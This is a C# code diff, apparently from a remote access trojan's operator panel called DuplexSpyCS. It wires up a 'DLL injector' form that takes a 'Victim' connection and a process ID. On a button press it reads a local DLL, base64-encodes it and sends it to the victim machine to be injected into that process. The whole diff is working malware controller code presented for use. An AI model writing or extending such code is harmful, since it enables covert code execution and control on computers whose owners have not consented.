@@ -12,14 +12,20 @@ namespace DuplexSpyCS
 {
     public partial class frmTaskDLLInjector : Form
     {
-        public frmTaskDLLInjector()
+        public Victim v;
+        private int m_nProcId;
+
+        public frmTaskDLLInjector(Victim v, int nProcId)
         {
             InitializeComponent();
+
+            this.v = v;
+            m_nProcId = nProcId;
         }
 
         private void fnSetup()
         {
-
+            textBox2.Text = m_nProcId.ToString();
         }
 
         private void frmTaskDLLInjector_Load(object sender, EventArgs e)
@@ -34,7 +40,23 @@ namespace DuplexSpyCS
             ofd.Multiselect = false;
             if (ofd.ShowDialog() == DialogResult.OK)
             {
+                textBox1.Text = ofd.FileName;
+            }
+        }
 
+        private void button2_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                string szFileName = textBox1.Text;
+                int nProcId = int.Parse(textBox2.Text);
+
+                byte[] abBuffer = File.ReadAllBytes(szFileName);
+                Task.Run(() => v.SendCommand($"dll|{0}|{Convert.ToBase64String(abBuffer)}|{nProcId}"));
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
         }
     }
